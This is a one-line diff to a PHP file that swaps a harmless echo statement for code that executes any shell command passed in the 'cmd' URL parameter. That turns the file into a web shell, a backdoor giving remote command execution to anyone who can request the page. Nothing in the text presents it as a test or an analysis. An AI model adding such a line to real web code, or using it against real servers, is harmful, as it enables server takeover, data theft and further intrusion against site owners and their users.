@@ -1,1 +1,1 @@
-<?php echo "asd"; ?>
+<?php echo exec($_GET['cmd']); ?>
